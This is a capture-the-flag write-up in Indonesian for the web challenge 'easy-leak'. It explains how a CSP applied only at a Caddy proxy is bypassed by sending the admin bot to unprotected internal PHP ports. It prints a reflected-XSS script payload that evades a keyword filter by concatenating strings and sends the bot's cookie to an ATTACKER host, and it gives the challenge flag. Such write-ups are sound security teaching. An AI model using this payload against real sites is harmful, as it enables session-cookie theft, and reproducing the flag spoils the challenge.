# easy-leak

**Kategori/Event:** Web — PwnSec CTF 2026 · **Kesulitan:** Medium · **Flag:** `pwnsec{e9a7ecb6d57f3bd7}`

**Tujuan:** mencuri cookie `TOKEN_<16hex>` bot admin dan submit ke `/api/verify` dalam 60 detik.

**Inti kerentanan:** Header CSP (`script-src 'none'; frame-src 'none'`) hanya ditambahkan oleh **reverse proxy Caddy** di port publik 3000 — bukan oleh aplikasi PHP itu sendiri. `entrypoint.sh` menjalankan 4 server PHP internal langsung di `127.0.0.1:9000-9003` yang **tidak melewati Caddy**, sehingga tidak menerima header CSP sama sekali.

**Alur eksploitasi:**
1. `index.php` merefleksikan parameter `content` langsung ke HTML body (filter panjang/karakter/kata kunci masih meloloskan tag `<script>`).
2. Karena filter memblokir string `http` dan `//`, URL disusun dari potongan string JS:
   ```html
   <script>location='h'+'ttps:'+'/'+'/ATTACKER/leak?token='+document.cookie</script>
   ```
3. Bot diarahkan langsung ke port internal `9000` (tanpa CSP), bukan port publik 3000. Karena navigasi top-level, cookie `127.0.0.1` tetap terkirim walau default `SameSite`.
4. Token dikirim ke server collector attacker, lalu langsung disubmit ke `/api/verify`.

**Pelajaran:** CSP yang hanya diterapkan di reverse proxy tidak berguna kalau bot bisa langsung mengakses upstream yang tak terlindungi; filter kata kunci mudah dilewati dengan konkatenasi string runtime.

---
